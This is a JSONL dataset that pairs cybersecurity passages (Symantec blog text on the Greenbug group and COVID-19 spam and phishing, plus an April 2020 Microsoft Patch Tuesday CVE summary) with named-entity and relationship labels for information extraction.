{"instruction": "The setting up of tunnels shows how important keeping a low-profile is for this group. Its focus on stealing credentials, and on establishing connections with database servers, shows that it is aiming to achieve a high level of access to a victim\u2019s network - access that if exploited could cause havoc on a compromised network very quickly. This level of access, if leveraged by actors using disruptive malware or ransomware, could shut down an organization\u2019s entire network very quickly. Previous victims of Greenbug have included organizations in the aviation, government, investment, and education sectors, as well as the telecoms sector, with attacks against telecoms organizations in the Middle East in 2017. In 2019, we observed 18 nation-state backed groups targeting the telecoms sector worldwide, so it seems to be an area of interest for sophisticated actors recently.", "input": null, "output": "Named Entities: (Greenbug, attacker), (ransomware, threat type)\nRelationships: No related relations."}
{"instruction": "It is probably not too hard to understand why the telecommunications industry, made up of phone providers and internet service providers (ISPs), is attractive to APT groups, whose main motivation is most often intelligence gathering. The access to calls, communications logs, and messages offered by telecoms companies makes them hugely valuable targets for these attackers. We can only speculate about Greenbug\u2019s motives for targeting these specific telecoms companies, but it is clear that comprehensive and persistent access to victim networks remains the key priority for this group.", "input": null, "output": "Named Entities: (APT groups, attacker), (Greenbug, attacker)\nRelationships: No related relations."}
{"instruction": "Text-Based COVID-19 Spam Wants Your Information, Money", "input": null, "output": "Named Entities: (Text-Based Spam, threat type)\nRelationships: No related relations."}
{"instruction": "Symantec\u2019s Email Threat Isolation stops spammers as they continue to take advantage of coronavirus pandemic. \nThis is a follow-up to our previous blog on COVID-19 related spam campaigns . This blog will share some insight on the latest wave of COVID-19 themed spam campaigns and how Email Threat Isolation (ETI) from Symantec stops these emails from accomplishing their goals. \nSymantec has continued to observe numerous malicious email campaigns taking advantage of the global panic surrounding the coronavirus outbreak. While we previously discussed malspam (malware bearing) emails, now a wave of text-based spam campaigns have emerged. These emails do not contain any malicious attachments and instead rely on what is written in the email to trick users into handing over information or money.", "input": null, "output": "Named Entities: (malspam (malware bearing) emails, threat type)\nRelationships: No related relations."}
{"instruction": "Change is the only constant \nAccording to Symantec telemetry, as well as COVID-19 related phishing and malspam campaigns, spammers are increasingly using text-based campaigns. One reason for this is that it is comparatively cheaper and easier than phishing and malspam campaigns as there is no need for compromised domains or malware. The most abused vanity TLDs used in these campaigns are .xyz, .top, and .site. \nThese text-based spam campaigns include the following types of scams: \nBusiness proposition emails from small to medium-sized manufacturing factories offering to sell medical equipment like surgical face masks, personal protective equipment (PPE) kits, sanitizers, and ventilators \nEmails from generous donors claiming to be giving away large sums of money to those in need \nLottery scam emails \nEmails asking for donations from individuals via cryptocurrency or gift cards \nFigure 1. Blocked COVID-19 related emails: March 25 \u2013 May 19, 2020", "input": null, "output": "Named Entities: (phishing, threat type), (malspam, threat type)\nRelationships: No related relations."}
{"instruction": "Symantec Email Threat Isolation \nOne of the best solutions or defense mechanisms provided by Symantec to its customers is Email Threat Isolation (ETI). ETI \ntechnology checks emails and attachments for phishing URLs or malicious content hosted on them. This technology de-risks the threat scenario by providing an extra layer of protection that allows users to safely browse unknown or shady websites, without risk of malware infection or credential theft. ETI is offered within the Symantec Email Security.cloud and Symantec Messaging Gateway solutions, and also as a standalone product that works with email security solutions from other vendors.", "input": null, "output": "No related entities and relations."}
{"instruction": "Phishing emails disguised as COVID-19 reports Phishing emails masquerading as COVID-19 funding reports are being spread in spam campaigns. These emails try their best to trick recipients into clicking on links that lead to phishing web pages designed to steal credentials. Threat actors have designed convincing email templates that appear to come from reputable file-sharing/storage services and use them for their phishing campaigns. An example of this can be seen in Figure 2. The email content is kept short and mentions that a confidential document has been shared with the email recipient. In order to view the \u201c Confidentiality.pdf \u201d file, the user needs to click on \u201c OPEN FILE \u201d, beneath which a recently registered domain is used to form a phishing URL: https://[REMOVED]covid.com/ The phishing URL opens as a legitimate looking login page requesting the user to enter credentials.", "input": null, "output": "Named Entities: (Phishing emails, threat type), (spam campaigns, threat type), (phishing web pages, threat type), (file-sharing/storage services, tool), (Confidentiality.pdf, file), (https://[REMOVED]covid.com/, URL)\nRelationships: (Phishing emails, spread in, spam campaigns), (spam campaigns, use, phishing web pages), (file-sharing/storage services, used for, phishing campaigns)"}
{"instruction": "Figure 2. Phishing email disguised as a notification message regarding a confidential document In Figure 3, Email Threat Isolation (ETI) alerts the user that the web page is potentially unsafe to visit and automatically enables the protected view with read-only mode. This helps to safeguard the user\u2019s credentials or confidential information from being compromised. Figure 3. Symantec\u2019s Email Threat Isolation (ETI) warns the user about the phishing web page and enables a protected view with read-only mode In Figure 4, a bogus email template is used to tell the recipient that a COVID-19 report file has been shared with them. When the \u201c View \u201d button is clicked, the user is brought to a phishing web page constructed with the help of a compromised domain: https://[REMOVED]/ssl/ [email protected] = Figure 4. Phishing email disguised as a COVID-19 funding report notification", "input": null, "output": "Named Entities: (Phishing email, threat type), (phishing web page, threat type)\nRelationships: No related relations."}
{"instruction": "Business proposition emails offering medical equipment These emails claim to come from small to medium-sized manufacturing firms, offering for sale a variety of medical equipment. The email templates used are kept simple and direct. As with many of these scam emails, there are often grammar, spelling, and punctuation errors present. In Figure 5, the threat actor provides a list of medical equipment specifying the type of respirators and masks available for purchase. The email also mentions that special chartered shipping services are available for VIP clients and provides shipping details. Figure 5. Spam email offering a variety of medical equipment with different shipping options In Figure 6, the threat actor poses as a supplier from China keen to ship various types of face masks to different parts of the world with abundant stock ready to ship.", "input": null, "output": "Named Entities: (scam emails, threat type)\nRelationships: No related relations."}
{"instruction": "Figure 6. Spam email supposedly from a supplier in China offering different types of face masks", "input": null, "output": "Named Entities: (Spam email, threat type)\nRelationships: No related relations."}
{"instruction": "Generous donors offer donations This is another variation of the infamous advance fee scam. These emails are generally kept short and try to attract victims by offering generous monetary donations. In Figure 7, a generous wealthy couple is supposedly donating money for the Covid-19 relief effort. The email asks the recipient to provide personal details to a lawyer in order to claim the money. Figure 7. Spam email offering a generous amount of donation as COVID-19 relief. The email shown in Figure 8 is supposedly from the United Nations, in relation to COVID-19 relief. The email asks the recipient to verify their email address, which will then allow the sender to begin a conversation with the user and begin their scam. The subject line of this email starts with \u201cRe:\u201d, a tactic used to trick the recipient into thinking the message is a continuation of previous correspondence.", "input": null, "output": "Named Entities: (advance fee scam, threat type)\nRelationships: No related relations."}
{"instruction": "Figure 8. Spam email supposedly from the United Nations requesting validation of an email address before compensation can be made", "input": null, "output": "No related entities and relations."}
{"instruction": "Lottery scam emails \nThese emails are themed as notification emails notifying the user they have been selected in a lottery to receive coronavirus compensation. In Figure 9, one of these emails asks the user to provide personal information before applying for their share of $1,000,000. \nFigure 9. Lottery scam email asks user for personal information", "input": null, "output": "Named Entities: (Lottery scam emails, threat type)\nRelationships: No related relations."}
{"instruction": "Requesting donations via cryptocurrency \nThese emails leverage cryptocurrencies and QR codes. The email shown in Figure 10 presents the recipient with a Bitcoin wallet address and a QR code to supposedly donate money or \u201cfood gift cards\u201d to help with the coronavirus pandemic relief effort. Scanning the QR code brings up the same Bitcoin wallet listed in the email text. The email also lists an email address where all gift cards should be forwarded to. \nFigure 10. Spam email leveraging Bitcoin wallet and QR code for fund donations \nIn Figure 11, the threat actor poses as a doctor and urges recipients to donate funds towards the COVID-19 Solidarity Response Fund, which will supposedly help with the production of a COVID-19 vaccine. Donations are requested to be paid to the provided Bitcoin wallet address. \nFigure 11. Spam email leveraging Bitcoin wallet to donate funds for production of Covid-19 vaccine", "input": null, "output": "Named Entities: (Bitcoin wallet address, tool), (QR code, tool), (spam email, threat type)\nRelationships: No related relations."}
{"instruction": "Snowshoe campaigns Snowshoe campaigns continue to be a firm favorite for spammers. These campaigns appear with heavy randomization in header fields to avoid detection. Snowshoe campaigns come in large batches in a short period of time. Along with heavy randomization of email features, these runs also use a myriad of topics and themes. In addition, these emails are distributed with a variety of originating IP addresses, domains with different gTLDs, and heavy obfuscation to avoid detection. In Figures 12 and 13, threat actors have made use of current affairs and designed their email templates accordingly. These include themes like \u201c Elon Musk Reveals How to Profit from Coronavirus \u201d and the promotion of a \u201c Touch Free Body Thermometer. \u201d Ultimately, the URLs hyperlinked beneath the words \u201c Register now! \u201d and \u201c Browse Thermometers \u201d contain newly registered spam domains.", "input": null, "output": "Named Entities: (spammers, attacker), (spam, threat type), (randomization in header fields, tool)\nRelationships: No related relations."}
{"instruction": "Figure 12. Snowshoe spam email on \u201cHow to Profit from Coronavirus!\u201d Figure 13. Snowshoe spam email promoting \u201cTouch Free Body Thermometer\u201d", "input": null, "output": "Named Entities: (spam email, threat type)\nRelationships: No related relations."}
{"instruction": "Mitigation steps \nEmail users are requested to thoroughly check emails and if deemed suspicious, please report it to Symantec . \nQuestion any emails requesting actions that seem unusual or aren't following normal procedures. \nAnalyze potential threats using analytics technologies that can pick up on the subtle differences between clean and infected emails and identify indicators of compromise. \nConduct end-user awareness training to raise overall awareness of phishing among employees.", "input": null, "output": "Named Entities: (phishing, threat type)\nRelationships: No related relations."}
{"instruction": "Defense mechanisms At Symantec, response teams strive hard to protect our valuable customers by introducing new defense mechanisms against such challenging attacks. An array of defense mechanisms is deployed in different layers at .cloud and Symantec Mail gateway level to block similar attacks. Symantec Email Security.cloud Data Protection: Provides granular control to identify suspicious messages based on various indicators and helps to flag messages that are coming from outside the organization. Symantec Data Loss Prevention: Helps combat the data theft scenario by seamlessly integrating with our Email Security solutions.", "input": null, "output": "No related entities and relations."}
{"instruction": "Email threat isolation (ETI) from Symantec: Checks emails and attachments for phishing URLs or malicious content hosted on them. This technology de-risks the threat scenario by providing an extra layer of protection that allows users to safely browse unknown or shady websites, without risk of malware infection or credential theft. Symantec Email Threat Isolation is offered within the Symantec Email Security.cloud and Symantec Messaging Gateway solutions, and also as a standalone product that works with other vendors' email security solutions. Symantec Enterprise Blogs You might also enjoy 6 Min Read", "input": null, "output": "Named Entities: (phishing URLs, threat type)\nRelationships: No related relations."}
{"instruction": "COVID-19 Outbreak Prompts Opportunistic Wave of Malicious Email Campaigns Spammers, scammers, and other threat actors quick to take advantage of global panic surrounding coronavirus outbreak \nSymantec Enterprise Blogs You might also enjoy \n2 Min Read", "input": null, "output": "Named Entities: (malicious email campaigns, threat type), (Spammers, attacker), (scammers, attacker), (threat actors, attacker)\nRelationships: No related relations."}
{"instruction": "Malicious Android Apps Exploit Coronavirus Panic Symantec found almost a dozen Android apps that pretended to be monitoring the Covid-19 outbreak but were actually infected with malware.", "input": null, "output": "Named Entities: (Malicious Android Apps, malware), (Android apps, tool)\nRelationships: (Android apps, infected with, malware)"}
{"instruction": "Microsoft Patch Tuesday - April 2020", "input": null, "output": "No related entities and relations."}
{"instruction": "This month the vendor has patched 113 vulnerabilities, 18 of which are rated Critical. As always, customers are advised to follow these security best practices: Install vendor patches as soon as they are available. Run all software with the least privileges required while still maintaining functionality. Avoid handling files from unknown or questionable sources. Never visit sites of unknown or questionable integrity. Block external access at the network perimeter to all key systems unless specific access is required. Microsoft's summary of the April 2020 releases can be found here: https://portal.msrc.microsoft.com/en-us/security-guidance This month's update covers vulnerabilities in: Internet Explorer Edge ChakraCore Microsoft Office Microsoft Windows Microsoft Windows Kernel Microsoft Graphics Component Microsoft JET Database Engine Windows Hyper-V Visual Studio Microsoft Dynamics Microsoft Defender Microsoft Remote Desktop App Microsoft YourPhone Application for Android Microsoft MSR JavaScript Cryptography Library Microsoft OneDrive for Windows", "input": null, "output": "Named Entities: (https://portal.msrc.microsoft.com/en-us/security-guidance, URL)\nRelationships: No related relations."}
{"instruction": "The following is a breakdown of the issues being addressed this month: 1. Cumulative Security Updates for Microsoft Browsers Chakra Scripting Engine Memory Corruption Vulnerability (CVE-2020-0969) MS Rating: Critical A remote code execution vulnerability exists in the way that the Chakra scripting engine handles objects in memory in Microsoft Edge (HTML-based)L. The vulnerability could corrupt memory in such a way that an attacker could execute arbitrary code in the context of the current user. Scripting Engine Memory Corruption Vulnerability (CVE-2020-0968) MS Rating: Critical A remote code execution vulnerability exists in the way that the scripting engine handles objects in memory in Internet Explorer. The vulnerability could corrupt memory in such a way that an attacker could execute arbitrary code in the context of the current user. Scripting Engine Memory Corruption Vulnerability (CVE-2020-0970) MS Rating: Critical", "input": null, "output": "Named Entities: (CVE-2020-0969, vulnerability), (CVE-2020-0968, vulnerability), (CVE-2020-0970, vulnerability)\nRelationships: No related relations."}
{"instruction": "A remote code execution vulnerability exists in the way that the ChakraCore scripting engine handles objects in memory. The vulnerability could corrupt memory in such a way that an attacker could execute arbitrary code in the context of the current user. VBScript Remote Code Execution Vulnerability (CVE-2020-0967) MS Rating: Critical A remote code execution vulnerability exists in the way that the VBScript engine handles objects in memory. The vulnerability could corrupt memory in such a way that an attacker could execute arbitrary code in the context of the current user. Windows VBScript Engine Remote Code Execution Vulnerability (CVE-2020-0895) MS Rating: Important A remote code execution vulnerability exists in the way that the VBScript engine handles objects in memory. The vulnerability could corrupt memory in such a way that an attacker could execute arbitrary code in the context of the current user. VBScript Remote Code Execution Vulnerability (CVE-2020-0966) MS Rating: Important", "input": null, "output": "Named Entities: (CVE-2020-0967, vulnerability), (CVE-2020-0895, vulnerability), (CVE-2020-0966, vulnerability)\nRelationships: No related relations."}
{"instruction": "A remote code execution vulnerability exists in the way that the VBScript engine handles objects in memory. The vulnerability could corrupt memory in such a way that an attacker could execute arbitrary code in the context of the current user. 2. Cumulative Security Updates for Microsoft Office Microsoft SharePoint Remote Code Execution Vulnerability (CVE-2020-0974) MS Rating: Critical A remote code execution vulnerability exists in Microsoft SharePoint when the software fails to check the source markup of an application package. An attacker who successfully exploited the vulnerability could run arbitrary code in the context of the SharePoint application pool and the SharePoint server farm account. Microsoft SharePoint Remote Code Execution Vulnerability (CVE-2020-0929) MS Rating: Critical", "input": null, "output": "Named Entities: (CVE-2020-0974, vulnerability), (CVE-2020-0929, vulnerability)\nRelationships: No related relations."}
{"instruction": "A remote code execution vulnerability exists in Microsoft SharePoint when the software fails to check the source markup of an application package. An attacker who successfully exploited the vulnerability could run arbitrary code in the context of the SharePoint application pool and the SharePoint server farm account. Microsoft SharePoint Remote Code Execution Vulnerability (CVE-2020-0931) MS Rating: Critical A remote code execution vulnerability exists in Microsoft SharePoint when the software fails to check the source markup of an application package. An attacker who successfully exploited the vulnerability could run arbitrary code in the context of the SharePoint application pool and the SharePoint server farm account. Microsoft SharePoint Remote Code Execution Vulnerability (CVE-2020-0932) MS Rating: Critical", "input": null, "output": "Named Entities: (CVE-2020-0931, vulnerability), (CVE-2020-0932, vulnerability)\nRelationships: No related relations."}
{"instruction": "A remote code execution vulnerability exists in Microsoft SharePoint when the software fails to check the source markup of an application package. An attacker who successfully exploited the vulnerability could run arbitrary code in the context of the SharePoint application pool and the SharePoint server farm account. Microsoft Excel Remote Code Execution Vulnerability (CVE-2020-0906) MS Rating: Important A remote code execution vulnerability exists in Microsoft Excel software when the software fails to properly handle objects in memory. An attacker who successfully exploited the vulnerability could run arbitrary code in the context of the current user. Microsoft Excel Remote Code Execution Vulnerability (CVE-2020-0979) MS Rating: Important A remote code execution vulnerability exists in Microsoft Excel software when the software fails to properly handle objects in memory. An attacker who successfully exploited the vulnerability could run arbitrary code in the context of the current user.", "input": null, "output": "Named Entities: (CVE-2020-0906, vulnerability), (CVE-2020-0979, vulnerability)\nRelationships: No related relations."}
{"instruction": "Microsoft Office Access Connectivity Engine Remote Code Execution Vulnerability (CVE-2020-0961) MS Rating: Important A remote code execution vulnerability exists when the Microsoft Office Access Connectivity Engine improperly handles objects in memory. An attacker who successfully exploited this vulnerability could execute arbitrary code on a victim system. Microsoft Office Remote Code Execution Vulnerability (CVE-2020-0760) MS Rating: Important A remote code execution vulnerability exists when Microsoft Office improperly loads arbitrary type libraries. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Microsoft Office SharePoint XSS Vulnerability (CVE-2020-0923) MS Rating: Important A cross-site-scripting (XSS) vulnerability exists when Microsoft SharePoint Server does not properly sanitize a specially crafted web request to an affected SharePoint server. An authenticated attacker could exploit the vulnerability by sending a specially crafted request to an affected SharePoint server. Microsoft Office SharePoint XSS Vulnerability (CVE-2020-0924) MS Rating: Important", "input": null, "output": "Named Entities: (CVE-2020-0961, vulnerability), (CVE-2020-0760, vulnerability), (CVE-2020-0923, vulnerability), (CVE-2020-0924, vulnerability)\nRelationships: No related relations."}
{"instruction": "A cross-site-scripting (XSS) vulnerability exists when Microsoft SharePoint Server does not properly sanitize a specially crafted web request to an affected SharePoint server. An authenticated attacker could exploit the vulnerability by sending a specially crafted request to an affected SharePoint server. Microsoft Office SharePoint XSS Vulnerability (CVE-2020-0925) MS Rating: Important A cross-site-scripting (XSS) vulnerability exists when Microsoft SharePoint Server does not properly sanitize a specially crafted web request to an affected SharePoint server. An authenticated attacker could exploit the vulnerability by sending a specially crafted request to an affected SharePoint server. Microsoft Office SharePoint XSS Vulnerability (CVE-2020-0926) MS Rating: Important A cross-site-scripting (XSS) vulnerability exists when Microsoft SharePoint Server does not properly sanitize a specially crafted web request to an affected SharePoint server. An authenticated attacker could exploit the vulnerability by sending a specially crafted request to an affected SharePoint server. Microsoft Office SharePoint XSS Vulnerability (CVE-2020-0927) MS Rating: Important", "input": null, "output": "Named Entities: (CVE-2020-0925, vulnerability), (CVE-2020-0926, vulnerability), (CVE-2020-0927, vulnerability)\nRelationships: No related relations."}
{"instruction": "A cross-site-scripting (XSS) vulnerability exists when Microsoft SharePoint Server does not properly sanitize a specially crafted web request to an affected SharePoint server. An authenticated attacker could exploit the vulnerability by sending a specially crafted request to an affected SharePoint server. Microsoft Office SharePoint XSS Vulnerability (CVE-2020-0930) MS Rating: Important A cross-site-scripting (XSS) vulnerability exists when Microsoft SharePoint Server does not properly sanitize a specially crafted web request to an affected SharePoint server. An authenticated attacker could exploit the vulnerability by sending a specially crafted request to an affected SharePoint server. Microsoft Office SharePoint XSS Vulnerability (CVE-2020-0933) MS Rating: Important A cross-site-scripting (XSS) vulnerability exists when Microsoft SharePoint Server does not properly sanitize a specially crafted web request to an affected SharePoint server. An authenticated attacker could exploit the vulnerability by sending a specially crafted request to an affected SharePoint server. Microsoft Office SharePoint XSS Vulnerability (CVE-2020-0954) MS Rating: Moderate", "input": null, "output": "Named Entities: (CVE-2020-0930, vulnerability), (CVE-2020-0933, vulnerability), (CVE-2020-0954, vulnerability)\nRelationships: No related relations."}
{"instruction": "A cross-site-scripting (XSS) vulnerability exists when Microsoft SharePoint Server does not properly sanitize a specially crafted web request to an affected SharePoint server. An authenticated attacker could exploit the vulnerability by sending a specially crafted request to an affected SharePoint server. Microsoft Office SharePoint XSS Vulnerability (CVE-2020-0978) MS Rating: Important A cross-site-scripting (XSS) vulnerability exists when Microsoft SharePoint Server does not properly sanitize a specially crafted web request to an affected SharePoint server. An authenticated attacker could exploit the vulnerability by sending a specially crafted request to an affected SharePoint server. Microsoft SharePoint Remote Code Execution Vulnerability (CVE-2020-0920) MS Rating: Important A remote code execution vulnerability exists in Microsoft SharePoint when the software fails to check the source markup of an application package. An attacker who successfully exploited the vulnerability could run arbitrary code in the context of the SharePoint application pool and the SharePoint server farm account.", "input": null, "output": "Named Entities: (CVE-2020-0978, vulnerability), (CVE-2020-0920, vulnerability)\nRelationships: No related relations."}
{"instruction": "Microsoft SharePoint Remote Code Execution Vulnerability (CVE-2020-0971) MS Rating: Important A remote code execution vulnerability exists in Microsoft SharePoint when the software fails to check the source markup of an application package. An attacker who successfully exploited the vulnerability could run arbitrary code in the context of the SharePoint application pool and the SharePoint server farm account. Microsoft SharePoint Spoofing Vulnerability (CVE-2020-0972) MS Rating: Important A spoofing vulnerability exists when Microsoft SharePoint Server does not properly sanitize a specially crafted web request to an affected SharePoint server. An authenticated attacker could exploit the vulnerability by sending a specially crafted request to an affected SharePoint server. Microsoft SharePoint Spoofing Vulnerability (CVE-2020-0975) MS Rating: Important", "input": null, "output": "Named Entities: (CVE-2020-0971, vulnerability), (CVE-2020-0972, vulnerability), (CVE-2020-0975, vulnerability)\nRelationships: No related relations."}
{"instruction": "A spoofing vulnerability exists when Microsoft SharePoint Server does not properly sanitize a specially crafted web request to an affected SharePoint server. An authenticated attacker could exploit the vulnerability by sending a specially crafted request to an affected SharePoint server. Microsoft SharePoint Spoofing Vulnerability (CVE-2020-0976) MS Rating: Important A spoofing vulnerability exists when Microsoft SharePoint Server does not properly sanitize a specially crafted web request to an affected SharePoint server. An authenticated attacker could exploit the vulnerability by sending a specially crafted request to an affected SharePoint server. Microsoft SharePoint Spoofing Vulnerability (CVE-2020-0977) MS Rating: Important A spoofing vulnerability exists when Microsoft SharePoint Server does not properly sanitize a specially crafted web request to an affected SharePoint server. An authenticated attacker could exploit the vulnerability by sending a specially crafted request to an affected SharePoint server. Microsoft (MAU) Office Privilege Escalation Vulnerability (CVE-2020-0984) MS Rating: Important", "input": null, "output": "Named Entities: (CVE-2020-0976, vulnerability), (CVE-2020-0977, vulnerability), (CVE-2020-0984, vulnerability)\nRelationships: No related relations."}
{"instruction": "A privilege escalation vulnerability exists when the Microsoft AutoUpdate (MAU) application for Mac improperly validates updates before executing them. An attacker who successfully exploited the vulnerability who already has the ability to execute code on a system could elevate privileges. Microsoft Office Remote Code Execution Vulnerability (CVE-2020-0991) MS Rating: Important A remote code execution vulnerability exists in Microsoft Office software when the software fails to properly handle objects in memory. An attacker who successfully exploited the vulnerability could run arbitrary code in the context of the current user. Microsoft Word Remote Code Execution Vulnerability (CVE-2020-0980) MS Rating: Important A remote code execution vulnerability exists in Microsoft Word software when it fails to properly handle objects in memory. An attacker who successfully exploited the vulnerability could use a specially crafted file to perform actions in the security context of the current user. Outlook for Android Spoofing Vulnerability (CVE-2020-0973) MS Rating: Important", "input": null, "output": "Named Entities: (CVE-2020-0991, vulnerability), (CVE-2020-0980, vulnerability), (CVE-2020-0973, vulnerability)\nRelationships: No related relations."}
{"instruction": "A cross-site-scripting (XSS) vulnerability exists when Microsoft SharePoint Server does not properly sanitize a specially crafted web request to an affected SharePoint server. An authenticated attacker could exploit the vulnerability by sending a specially crafted request to an affected SharePoint server. 3. Cumulative Security Updates for Microsoft Windows Adobe Font Manager Library Remote Code Execution Vulnerability (CVE-2020-1020) MS Rating: Critical A remote code execution vulnerability exists in Microsoft Windows when the Windows Adobe Type Manager Library improperly handles a specially-crafted multi-master font - Adobe Type 1 PostScript format. For all systems except Windows 10, an attacker who successfully exploited the vulnerability could execute code remotely. OpenType Font Parsing Remote Code Execution Vulnerability (CVE-2020-0938) MS Rating: Critical", "input": null, "output": "Named Entities: (CVE-2020-1020, vulnerability), (CVE-2020-0938, vulnerability)\nRelationships: No related relations."}
{"instruction": "A privilege escalation vulnerability exists in the way the Windows Push Notification Service handles objects in memory. An attacker who successfully exploited this vulnerability could run processes in an elevated context. Windows Push Notification Service Privilege Escalation Vulnerability (CVE-2020-1006) MS Rating: Important A privilege escalation vulnerability exists in the way the Windows Push Notification Service handles objects in memory. An attacker who successfully exploited this vulnerability could run processes in an elevated context. Windows Push Notification Service Privilege Escalation Vulnerability (CVE-2020-1017) MS Rating: Important A privilege escalation vulnerability exists in the way the Windows Push Notification Service handles objects in memory. An attacker who successfully exploited this vulnerability could run processes in an elevated context. Windows Push Notification Service Information Disclosure Vulnerability (CVE-2020-1016) MS Rating: Important", "input": null, "output": "Named Entities: (CVE-2020-1006, vulnerability), (CVE-2020-1017, vulnerability), (CVE-2020-1016, vulnerability)\nRelationships: No related relations."}
{"instruction": "An information disclosure vulnerability exists when the Windows Push Notification Service improperly handles objects in memory. An attacker who successfully exploited this vulnerability could obtain information to further compromise the user's system. Windows Scheduled Task Privilege Escalation Vulnerability (CVE-2020-0936) MS Rating: Important A privilege escalation vulnerability exists when a Windows scheduled task improperly handles file redirections. An attacker who successfully exploited this vulnerability could delete a targeted file they would not have permissions to. Windows Token Security Bypass Vulnerability (CVE-2020-0981) MS Rating: Important A security bypass vulnerability exists when Windows fails to properly handle token relationships. An attacker who successfully exploited the vulnerability could allow an application with a certain integrity level to execute code at a different integrity level, leading to a sandbox escape. Windows Update Stack Privilege Escalation Vulnerability (CVE-2020-0985) MS Rating: Important", "input": null, "output": "Named Entities: (CVE-2020-0936, vulnerability), (CVE-2020-0981, vulnerability), (CVE-2020-0985, vulnerability)\nRelationships: No related relations."}
{"instruction": "A privilege escalation vulnerability exists when the Windows Update Stack fails to properly handle objects in memory. An attacker who successfully exploited this vulnerability could run arbitrary code in kernel mode. Windows Update Stack Privilege Escalation Vulnerability (CVE-2020-0996) MS Rating: Important A privilege escalation vulnerability exists when the Windows Update Stack fails to properly handle objects in memory. An attacker who successfully exploited this vulnerability could run arbitrary code in kernel mode. Connected User Experiences and Telemetry Service Privilege Escalation Vulnerability (CVE-2020-0942) MS Rating: Important A privilege escalation vulnerability exists when Connected User Experiences and Telemetry Service improperly handles file operations. An attacker who successfully exploited this vulnerability could overwrite files in arbitrary locations with elevated permissions. Connected User Experiences and Telemetry Service Privilege Escalation Vulnerability (CVE-2020-0944) MS Rating: Important", "input": null, "output": "Named Entities: (CVE-2020-0996, vulnerability), (CVE-2020-0942, vulnerability), (CVE-2020-0944, vulnerability)\nRelationships: No related relations."}
{"instruction": "A privilege escalation vulnerability exists when Connected User Experiences and Telemetry Service improperly handles file operations. An attacker who successfully exploited this vulnerability could run processes in an elevated context. DirectX Privilege Escalation Vulnerability (CVE-2020-0784) MS Rating: Important A privilege escalation vulnerability exists when DirectX improperly handles objects in memory. An attacker who successfully exploited this vulnerability could run arbitrary code in kernel mode. DirectX Privilege Escalation Vulnerability (CVE-2020-0888) MS Rating: Important A privilege escalation vulnerability exists when DirectX improperly handles objects in memory. An attacker who successfully exploited this vulnerability could run arbitrary code in kernel mode. Microsoft Windows Update Client Privilege Escalation Vulnerability (CVE-2020-1014) MS Rating: Important A privilege escalation vulnerability exists in the Microsoft Windows Update Client when it does not properly handle privileges. An attacker who successfully exploited this vulnerability could run processes in an elevated context. Media Foundation Information Disclosure Vulnerability (CVE-2020-0937) MS Rating: Important", "input": null, "output": "Named Entities: (CVE-2020-0784, vulnerability), (CVE-2020-0888, vulnerability), (CVE-2020-1014, vulnerability), (CVE-2020-0937, vulnerability)\nRelationships: No related relations."}
{"instruction": "An information disclosure vulnerability exists when Media Foundation improperly handles objects in memory. An attacker who successfully exploited this vulnerability could obtain information to further compromise the user's system. Media Foundation Information Disclosure Vulnerability (CVE-2020-0939) MS Rating: Important An information disclosure vulnerability exists when Media Foundation improperly handles objects in memory. An attacker who successfully exploited this vulnerability could obtain information to further compromise the user's system. Media Foundation Information Disclosure Vulnerability (CVE-2020-0945) MS Rating: Important An information disclosure vulnerability exists when Media Foundation improperly handles objects in memory. An attacker who successfully exploited this vulnerability could obtain information to further compromise the user's system. Media Foundation Information Disclosure Vulnerability (CVE-2020-0946) MS Rating: Important An information disclosure vulnerability exists when Media Foundation improperly handles objects in memory. An attacker who successfully exploited this vulnerability could obtain information to further compromise the user's system.", "input": null, "output": "Named Entities: (CVE-2020-0939, vulnerability), (CVE-2020-0945, vulnerability), (CVE-2020-0946, vulnerability)\nRelationships: No related relations."}
{"instruction": "Media Foundation Information Disclosure Vulnerability (CVE-2020-0947) MS Rating: Important An information disclosure vulnerability exists when Media Foundation improperly handles objects in memory. An attacker who successfully exploited this vulnerability could obtain information to further compromise the user's system. Windows Delivery Optimization Service Privilege Escalation Vulnerability (CVE-2020-0983) MS Rating: Important A privilege escalation vulnerability exists when the Windows Delivery Optimization service improperly handles objects in memory. An attacker who successfully exploited this vulnerability could run arbitrary code with elevated system privileges. Windows DNS Denial of Service Vulnerability (CVE-2020-0993) MS Rating: Important A denial of service vulnerability exists in Windows DNS when it fails to properly handle queries. An attacker who successfully exploited this vulnerability could cause the DNS service to become nonresponsive. Windows Privilege Escalation Vulnerability (CVE-2020-0934) MS Rating: Important", "input": null, "output": "Named Entities: (CVE-2020-0947, vulnerability), (CVE-2020-0983, vulnerability), (CVE-2020-0993, vulnerability), (CVE-2020-0934, vulnerability)\nRelationships: No related relations."}
{"instruction": "A privilege escalation vulnerability exists when the Windows WpcDesktopMonSvc improperly manages memory. To exploit this vulnerability, an attacker would first have to gain execution on the victim system. Windows Privilege Escalation Vulnerability (CVE-2020-1009) MS Rating: Important A privilege escalation vulnerability exists in the way that the Microsoft Store Install Service handles file operations in protected locations. An attacker who successfully exploited the vulnerability could execute code with elevated permissions. Windows Privilege Escalation Vulnerability (CVE-2020-1011) MS Rating: Important A privilege escalation vulnerability exists when the Windows System Assessment Tool improperly handles file operations. An attacker who successfully exploited this vulnerability could run processes in an elevated context. Windows Privilege Escalation Vulnerability (CVE-2020-1015) MS Rating: Important A privilege escalation vulnerability exists in the way that the User-Mode Power Service (UMPS) handles objects in memory. An attacker who successfully exploited the vulnerability could execute code with elevated permissions.", "input": null, "output": "Named Entities: (CVE-2020-1009, vulnerability), (CVE-2020-1011, vulnerability), (CVE-2020-1015, vulnerability)\nRelationships: No related relations."}
{"instruction": "Connected User Experiences and Telemetry Service Privilege Escalation Vulnerability (CVE-2020-1029) MS Rating: Important A privilege escalation vulnerability exists when Connected User Experiences and Telemetry Service improperly handles file operations. An attacker who successfully exploited this vulnerability could run processes in an elevated context. Windows Work Folder Service privilege Escalation Vulnerability (CVE-2020-1094) MS Rating: Important A privilege escalation vulnerability exists when the Windows Work Folder Service improperly handles file operations. An attacker who successfully exploited this vulnerability could run processes in an elevated context. Windows Denial of Service Vulnerability (CVE-2020-0794) MS Rating: Important A denial of service vulnerability exists when Windows improperly handles objects in memory. An attacker who successfully exploited the vulnerability could cause a target system to stop responding. 4. Cumulative Security Updates for Microsoft Windows Kernel Windows Kernel Privilege Escalation Vulnerability (CVE-2020-0913) MS Rating: Important", "input": null, "output": "Named Entities: (CVE-2020-1029, vulnerability), (CVE-2020-1094, vulnerability), (CVE-2020-0794, vulnerability), (CVE-2020-0913, vulnerability)\nRelationships: No related relations."}
